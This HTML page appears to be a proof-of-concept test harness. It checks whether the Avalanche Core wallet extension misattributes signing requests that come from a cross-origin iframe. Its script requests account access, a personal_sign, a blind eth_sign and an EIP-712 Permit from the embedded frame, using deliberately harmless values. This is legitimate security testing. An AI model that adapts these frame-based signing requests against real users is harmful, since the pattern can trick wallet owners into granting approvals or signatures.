<!doctype html>
<meta charset="utf-8">
<title>Controlled Origin B</title>
Controlled Core Extension cross-origin iframe B
<script>
'use strict';
const victimOrigin=new URLSearchParams(location.search).get('victimOrigin');
if(!victimOrigin||new URL(victimOrigin).origin!==victimOrigin)throw Error('Invalid victimOrigin');
const parentSend=data=>parent.postMessage(data,victimOrigin);
const randomHex=(bytes=12)=>{const a=new Uint8Array(bytes);crypto.getRandomValues(a);return[...a].map(v=>v.toString(16).padStart(2,'0')).join('')};
const textHex=text=>'0x'+[...new TextEncoder().encode(text)].map(v=>v.toString(16).padStart(2,'0')).join('');
async function call(method,params=[]){
  try{const value=await window.avalanche.request({method,params});parentSend({type:'RESULT',method,value,actualOrigin:location.origin})}
  catch(error){parentSend({type:'RESULT',method,error:{code:error?.code,message:error?.message||String(error)},actualOrigin:location.origin})}
}
addEventListener('message',event=>{
  if(event.source!==parent||event.origin!==victimOrigin)return;
  const {type,account,chainId}=event.data||{};
  if(type==='ACCOUNTS')return call('eth_accounts');
  if(!/^0x[0-9a-fA-F]{40}$/.test(account))return;
  if(type==='PERSONAL'){const n=randomHex();const message=`CORE EXTENSION CROSS-FRAME TEST\nActual sender: ${location.origin}\nVictim A: ${victimOrigin}\nNonce: ${n}`;return call('personal_sign',[textHex(message),account])}
  if(type==='BLIND')return call('eth_sign',[account,'0x'+randomHex(32)]);
  if(type==='PERMIT'){
    const typedData={types:{EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],Permit:[{name:'owner',type:'address'},{name:'spender',type:'address'},{name:'value',type:'uint256'},{name:'nonce',type:'uint256'},{name:'deadline',type:'uint256'}]},primaryType:'Permit',domain:{name:'Controlled Non-Contract Test',version:'1',chainId:Number.parseInt(chainId,16),verifyingContract:account},message:{owner:account,spender:'0x000000000000000000000000000000000000dEaD',value:'1',nonce:'0',deadline:'1'}};
    return call('eth_signTypedData_v4',[account,JSON.stringify(typedData)]);
  }
});
function ready(){parentSend({type:'READY',actualOrigin:location.origin,victimOrigin,isSubframe:self!==top,coreProvider:Boolean(window.avalanche?.request)})}
addEventListener('avalanche#initialized',ready,{once:true});
ready();
</script>
